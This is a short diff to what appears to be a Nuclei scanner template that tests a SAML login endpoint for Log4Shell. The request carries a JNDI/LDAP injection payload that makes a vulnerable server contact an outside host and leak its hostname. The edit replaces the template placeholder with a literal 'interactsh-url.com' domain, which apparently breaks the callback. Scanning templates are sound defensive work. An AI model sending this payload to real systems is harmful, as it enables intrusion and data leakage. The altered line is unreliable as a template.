@@ -25,7 +25,7 @@ variables:
 http:
   - raw:
       - |
-        GET /login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
+        GET /login/SAML?=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}} HTTP/1.1
         Host: {{Hostname}}
 
     matchers-condition: and
